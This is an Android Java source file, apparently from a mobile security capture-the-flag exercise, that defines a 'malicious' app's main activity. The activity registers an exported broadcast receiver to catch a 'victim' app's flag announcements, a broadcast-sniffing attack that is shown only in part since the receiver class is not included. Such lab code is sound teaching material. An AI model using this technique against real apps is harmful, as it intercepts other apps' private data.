package com.example.maliciousapp;

import android.content.BroadcastReceiver;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MOBIOTSEC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        BroadcastReceiver br = new MyBroadcastReceiver();
        ContextCompat.registerReceiver(
                this,
                br,
                new IntentFilter("victim.app.FLAG_ANNOUNCEMENT"),
                ContextCompat.RECEIVER_EXPORTED
        );
    }
}
